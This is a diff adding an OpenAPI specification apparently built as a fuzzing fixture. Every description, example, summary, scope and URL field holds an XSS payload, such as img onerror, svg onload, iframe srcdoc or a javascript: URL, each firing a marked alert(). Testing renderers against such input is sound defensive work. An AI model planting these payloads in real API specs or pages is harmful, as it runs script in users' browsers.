@@ -1,0 +1,92 @@
+{
+  "openapi": "3.0.0",
+  "info": {
+  "description": "<iframe srcdoc='\n<script>alert(`srcdoc_exec`)</script>\n'></iframe>"
+  },
+  "paths": {
+    "/xss": {
+      "get": {
+        "summary": "<svg onload=alert('summary')>",
+        "description": "<img src=404 onerror=alert('get_desc')>",
+        "parameters": [
+          {
+            "name": "vuln",
+            "in": "query",
+            "required": true,
+            "schema": {
+              "type": "string",
+              "example": "<img src=x onerror=alert('param_example')>"
+            },
+            "description": "<svg onload=alert('param_desc')>"
+          },
+          {
+            "name": "callback",
+            "in": "query",
+            "required": false,
+            "schema": {
+              "type": "string",
+              "example": "<iframe srcdoc='<script>alert(`callback`)</script>'></iframe>"
+            },
+            "description": "<math><mtext><img src=x onerror=alert(6)></math>"
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "<svg/onload=alert('200_desc')>",
+            "content": {
+              "application/json": {
+                "example": {
+                  "xss": "<img src=x onerror=alert('200_example')>"
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  },
+  "components": {
+    "schemas": {
+      "Exploit": {
+        "type": "object",
+        "properties": {
+          "payload": {
+            "type": "string",
+            "description": "<svg/onload=alert('schema_prop')>",
+            "example": "<iframe srcdoc='<script>alert(`schema_example`)</script>'></iframe>"
+          }
+        },
+        "description": "<img src=x onerror=alert('schema_desc')>"
+      }
+    },
+    "securitySchemes": {
+      "oauth2": {
+        "type": "oauth2",
+        "flows": {
+          "implicit": {
+            "authorizationUrl": "javascript:alert('oauth')",
+            "scopes": {
+              "read": "<img src=x onerror=alert('scope_desc')>"
+            }
+          }
+        }
+      }
+    }
+  },
+  "security": [
+    {
+      "oauth2": ["read"]
+    }
+  ],
+  "externalDocs": {
+    "description": "<svg/onload=alert('externalDocs')>",
+    "url": "javascript:alert('external_url')"
+  },
+  "x-injected": "<script>alert('x-custom')</script>",
+  "tags": [
+    {
+      "name": "fuzz",
+      "description": "<img src=fail onerror=alert('tag_desc')>"
+    }
+  ]
+}
